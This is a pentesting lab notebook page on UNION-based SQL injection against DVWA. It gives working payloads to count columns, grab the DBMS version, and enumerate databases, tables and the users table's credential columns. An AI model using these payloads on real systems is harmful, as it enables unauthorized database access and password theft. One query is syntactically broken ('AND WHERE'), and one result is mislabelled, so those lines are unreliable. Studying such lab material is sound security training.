# 01 - Database Reconnaissance

Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa

## 1.1 - Dump Database

### 1.1.1 - Columns Enumeration

^78ef92

#### 1.1.1.1 - UNION Detection

We can double confirm using [[Pentesting Phases/WebApp Hacking/Injection/SQL Injection/01 - In-Band SQL Injection/Lab Simulation/01 - DVWA/Difficulty/Low/Manual/02 - Error-Based Query SQL Injection/01 - Database Reconnaissance#^f521af|error-based (ORDER BY)]] fields enumeration.

```sql
' UNION SELECT 1, 2#

' UNION SELECT 1, 2, 3#

' UNION SELECT NULL, NULL#

' UNION SELECT NULL, NULL, NULL#
```

### 1.1.2 - Enumeration and Discovery

#### 1.1.2.1 - UNION Enumeration

##### 1.1.2.1.1 - Banner Grab

Sometimes when we try to retrieve error messages. Sometimes the warning messages may not provide us the SQL server software might be running. However, we can discover it even further to grab the version of the DBMS back-end software is running.

```sql
' UNION SELECT 1, @@VERSION#

' OR 1=1 UNION SELECT 1, @@VERSION#

' UNION SELECT NULL, @@VERSION#

' OR 1=1 UNION SELECT NULL, @@VERSION#
```

- The DBMS server is MariaDB which is a fork of MySQL.

![[1.1 - Banner Grab.png]]

##### 1.1.2.1.2 - Current Database

```sql
' UNION SELECT NULL, DATABASE()#
```

- The current database is `dvwa`

![[1.2 - Current Database.png]]

##### 1.1.2.1.3 - Current Database User

```sql
' UNION SELECT NULL, USER()#
```

- The current database is `dvwa@localhost`

![[1.3 - Current User.png]]

#### 1.1.2.2 - Schema Database Enumeration

```sql
' UNION SELECT NULL, schema_name FROM information_schema.schemata#
```

![[1.4 - Enumerate Databases.png]]

Let's enumerate the tables.

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables#

' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
```

![[1.5 - Enumerate Tables With The Current Database.png]]

You can narrow it down.

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database() AND WHERE table_name LIKE 'user%'#
```

Let's note down the tables we've discovered that are potential to retrieve data.

```
users
```

Let's enumerate the columns.

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns#

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = database() AND table_name = 'users'#
```

![[1.6 - Enumerate Columns With The Current Database.png]]

Let's note down the columns we've discovered that are potential to retrieve data

```
user
password
```